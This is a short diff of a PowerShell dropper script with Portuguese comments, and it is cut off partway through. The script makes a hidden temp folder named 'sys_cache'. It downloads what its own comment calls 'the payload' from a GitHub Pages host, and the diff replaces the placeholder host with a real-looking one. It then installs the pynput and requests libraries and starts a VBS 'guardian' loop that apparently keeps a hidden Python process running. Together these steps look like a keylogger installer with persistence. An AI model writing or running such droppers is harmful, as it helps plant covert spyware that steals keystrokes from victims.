@@ -1,13 +1,13 @@
 $dir = "$env:TEMP\sys_cache"
 if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
 
-# Baixa o payload
-Invoke-WebRequest -Uri "https://seu-usuario.github.io/sys-cache-update/sys_cache.py" -OutFile "$dir\sys_cache.py"
+# Baixa o payload do seu link real
+Invoke-WebRequest -Uri "https://syslog992.github.io/sys-cache-update/sys_cache.py" -OutFile "$dir\sys_cache.py"
 
-# Tenta instalar as bibliotecas
+# Instala dependências
 python -m pip install pynput requests --quiet
 
-# Guardião VBS Inteligente (Evita múltiplos processos pythonw.exe)
+# Guardião VBS Inteligente
 $vbs = @"
 Set WshShell = CreateObject("WScript.Shell")
 Do
